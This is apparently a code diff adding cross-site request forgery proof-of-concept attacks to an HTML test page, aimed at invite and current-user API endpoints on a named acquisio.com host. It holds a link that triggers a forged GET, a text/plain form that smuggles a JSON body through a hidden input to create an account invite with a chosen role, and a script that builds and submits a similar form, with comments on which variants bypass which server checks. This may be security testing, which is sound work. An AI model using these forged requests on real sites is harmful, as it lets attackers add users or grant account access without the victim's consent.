@@ -6,7 +6,26 @@
     <script src="scripts/jquery-1.8.3.js"></script>
 </head>
 <body>
+
+    <!-- construct XML request would not work, need to set the cookie manually which you would not know-->
     <button id="csrf">Request</button>
+
+    <!-- GET would work-->
+    <a href="https://bouvmappfork29.acquisio.com/new/api/users/current">click!</a>
+    <br/>
+
+    <!-- FORM POST would work if server accept text/plain as content-type. cannot post application/json data via a form-->
+    <form method="post" action="https://bouvmappfork29.acquisio.com/new/api/accounts/27080/invites" enctype="text/plain">
+        <!--<input type="hidden" name='{"key": "value", "key1": "value1"}'/>-->
+        <!--<input type="hidden" name='{"invitee":{"id":42524,"email":"sanaz@yopmail.com","permissions":{"role":"STANDARD","clients":[83754,83744]}}}'/>-->
+        <input type="hidden" name='{"invitee":{"inviteeIdentifier":"q11dwqd","email":"dwqdq22w@dqw.qwcc","permissions":{"role":"STANDARD","clients":[83754,83744]}},"template":"Acquisio default invite email","inviter":{"id":640070}}'/>
+        <input type="submit"/>
+    </form>
+
+    <!-- would not work for servers that validate 'content-type' for 'application/json'-->
+    <form id="myform"></form>
+    <button id="csrf2">post</button>
+
 </body>
 <script>
     $('#csrf').on('click', function() {
@@ -19,5 +38,21 @@
             }
         });
     });
+
+    $('#csrf2').on('click', submitform);
+
+    function submitform() {
+        var url = 'https://bouvmappfork29.acquisio.com/new/api/accounts/27080/invites';
+        $('#myform').attr('action', url);
+        $('#myform').attr('method', 'post');
+        var data = JSON.stringify({
+            "invitee":{"inviteeIdentifier":"q11dwqd","email":"dwqdq22w@dqw.qwcc","permissions":{"role":"STANDARD","clients":[83754,83744]}},
+            "template":"Acquisio default invite email",
+            "inviter":{"id":640070}
+        });
+        $('<input type="hidden" name="json"/>').val(data).appendTo('#myform');
+        $("#myform").submit();
+    }
+
 </script>
 </html>
